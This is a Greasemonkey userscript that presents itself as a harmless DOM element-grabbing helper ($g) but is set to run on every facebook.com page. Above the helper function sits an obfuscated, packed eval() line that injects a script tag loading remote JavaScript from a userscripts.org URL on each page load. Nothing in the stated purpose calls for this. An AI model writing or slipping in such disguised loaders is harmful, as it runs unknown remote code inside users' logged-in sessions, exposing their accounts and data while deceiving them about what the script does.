// ==UserScript==
// @name           Advanced Element Grabber ($g) Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      http://userscripts.org/users/23652
// @description    Advanced Element Grabber by JoeSimmons. Supports ID, Class, and XPath (full with types) in one query. Supports multiple id/class grabs in one query (split by spaces), and the ability to remove all nodes regardless of type
// @include        http://example.iana.org/*
// @copyright      JoeSimmons
// @version        1.0.61
// @license        Creative Commons Attribution-NoDerivs 3.0 Unported (CC BY-ND 3.0)
// ==/UserScript==

// $g by JoeSimmons. Supports ID, Class, and XPath (full with types) in one query
// Supports multiple id/class grabs in one query (split by spaces), and the ability to remove all nodes regardless of type
// See script page for syntax examples: http://userscripts.org/scripts/show/51532
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))

function $g(que, O) {

	if(!que || typeof que !== "string" || que === "" || !(que=que.replace(/^\s+/,''))) return false;
	var obj = O || ({del:false, type:6, node:document}), r, t,
		idclass_re = /^[#\.](?!\/)[^\/]/,
		xp_re=/^\.?(\/{1,2}|count|id)/;

	if(idclass_re.test(que)) {
		var s=que.split(" "), r=new Array(), c;
		for(var n=0; n<s.length; n++) {
			switch(s[n].substring(0,1)) {
			
				case "#": r.push(document.getElementById(s[n].substring(1))); break;
				
				case ".": c=document.getElementsByClassName(s[n].substring(1));
					if(c.length>0) for(var i=0; i<c.length; i++) r.push(c[i]); break;
			}
		}
		if(r.length==1) r=r[0];
	} else if(xp_re.test(que)) {
		r = (obj["doc"] || document).evaluate(que, (obj['node']||document), null, ((t=obj['type']) || 6), null);
		if(typeof t === "number" && /[12389]/.test(t)) r = r[(t === 1 ? "number" : (t === 2 ? "string" : (t === 3 ? "boolean" : "singleNode"))) + "Value"];
	}

	if(r && obj["del"] === true) {
		if(r.nodeType === 1) r.parentNode.removeChild(r);
			else if(r.snapshotItem) for(var i=r.snapshotLength-1; (item=r.snapshotItem(i)); i--) item.parentNode.removeChild(item);
			else if(!r.snapshotItem) for(var i=r.length-1; i>=0; i--) if(r[i]) r[i].parentNode.removeChild(r[i]);
	} return r;

}